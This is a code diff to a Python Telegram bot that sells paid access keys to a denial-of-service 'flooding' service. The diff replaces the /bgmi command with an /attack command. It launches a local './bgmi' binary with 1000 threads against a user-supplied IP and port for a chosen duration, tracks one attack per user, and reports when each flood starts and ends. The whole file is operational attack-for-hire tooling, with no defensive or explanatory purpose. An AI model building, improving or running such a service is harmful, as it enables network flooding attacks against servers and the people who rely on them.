@@ -4,7 +4,7 @@ import os
 import random
 import string
 import datetime
-import time
+import asyncio
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
@@ -12,19 +12,19 @@ from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 USER_FILE = "users.json"
 KEY_FILE = "keys.json"
 
-flooding_process = None
-flooding_command = None
-
 DEFAULT_THREADS = 1000
 DEFAULT_PACKET = 9
 
 users = {}
 keys = {}
+user_processes = {}  # Dictionary to track processes for each user
+
 
 def load_data():
     global users, keys
     users = load_users()
     keys = load_keys()
+
 
 def load_users():
     try:
@@ -36,9 +36,11 @@ def load_users():
         print(f"Error loading users: {e}")
         return {}
 
+
 def save_users():
     with open(USER_FILE, "w") as file:
         json.dump(users, file)
+
 
 def load_keys():
     try:
@@ -50,18 +52,21 @@ def load_keys():
         print(f"Error loading keys: {e}")
         return {}
 
+
 def save_keys():
     with open(KEY_FILE, "w") as file:
         json.dump(keys, file)
+
 
 def generate_key(length=6):
     characters = string.ascii_letters + string.digits
     return ''.join(random.choice(characters) for _ in range(length))
 
+
 def add_time_to_current_date(hours=0, days=0):
     return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
 
-# Command to generate keys
+
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     if user_id in ADMIN_IDS:
@@ -81,12 +86,11 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 save_keys()
                 response = f"Key generated: {key}\nExpires on: {expiration_date}"
             except ValueError:
-                response = "Please specify a valid number and unit of time (hours/days) "
+                response = "Please specify a valid number and unit of time (hours/days)."
         else:
             response = "Usage: /genkey <amount> <hours/days>"
     else:
-        response = "ONLY OWNER CAN USE💀OWNER @..."
-
+        response = "ONLY OWNER CAN USE 💀 OWNER @..."
     await update.message.reply_text(response)
 
 
@@ -106,13 +110,51 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_users()
             del keys[key]
             save_keys()
-            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @"
+            response = f"✅ Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @"
         else:
-            response = "Invalid or expired key buy from @"
+            response = "Invalid or expired key. Buy from @."
     else:
         response = "Usage: /redeem <key>"
-
     await update.message.reply_text(response)
+
+
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global user_processes
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @")
+        return
+
+    if len(context.args) != 4:
+        await update.message.reply_text('Usage: /attack <target_ip> <port> <duration> <sid>')
+        return
+
+    target_ip = context.args[0]
+    port = context.args[1]
+    duration = int(context.args[2])  # Convert duration to an integer (seconds)
+    packet = context.args[3]
+
+    if user_id in user_processes and user_processes[user_id].poll() is None:
+        await update.message.reply_text("⚠️ An attack is already running. Please wait for it to finish.")
+        return
+
+    flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
+
+    # Start the flooding process for the user
+    process = subprocess.Popen(flooding_command)
+    user_processes[user_id] = process
+
+    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
+
+    # Wait for the specified duration asynchronously
+    await asyncio.sleep(duration)
+
+    # Terminate the flooding process after the duration
+    process.terminate()
+    del user_processes[user_id]
+
+    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {duration} seconds.')
 
 
 async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -128,42 +170,10 @@ async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 except Exception:
                     response += f"- User ID: {user_id} expires on {expiration_date}\n"
         else:
-            response = "No data found"
+            response = "No data found."
     else:
         response = "ONLY OWNER CAN USE."
     await update.message.reply_text(response)
-
-
-async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_command, flooding_process
-    user_id = str(update.message.from_user.id)
-
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @")
-        return
-
-    if len(context.args) != 4:
-        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration> <sid>')
-        return
-
-    target_ip = context.args[0]
-    port = context.args[1]
-    duration = int(context.args[2])  # Convert duration to an integer (seconds)
-    packet = context.args[3]
-
-    flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
-    
-    # Start the flooding process
-    flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
-
-    # Wait for the specified duration
-    time.sleep(duration)
-
-    # Terminate the flooding process after the duration
-    flooding_process.terminate()
-
-    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {duration} seconds.')
 
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -182,7 +192,6 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         response = "Message sent to all users."
     else:
         response = "ONLY OWNER CAN USE."
-    
     await update.message.reply_text(response)
 
 
@@ -195,9 +204,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
         "User Commands:\n"
         "/redeem <key> - Redeem a key to gain access.\n"
-        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters and start attack.\n"
+        "/attack <target_ip> <port> <duration> <sid> - Start a flooding attack.\n"
     )
     await update.message.reply_text(response)
+
 
 def main() -> None:
     application = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -205,12 +215,13 @@ def main() -> None:
     application.add_handler(CommandHandler("genkey", genkey))
     application.add_handler(CommandHandler("redeem", redeem))
     application.add_handler(CommandHandler("allusers", allusers))
-    application.add_handler(CommandHandler("bgmi", bgmi))
+    application.add_handler(CommandHandler("attack", attack))  # Updated command
     application.add_handler(CommandHandler("broadcast", broadcast))
     application.add_handler(CommandHandler("help", help_command))
 
     load_data()
     application.run_polling()
+
 
 if __name__ == '__main__':
     main()
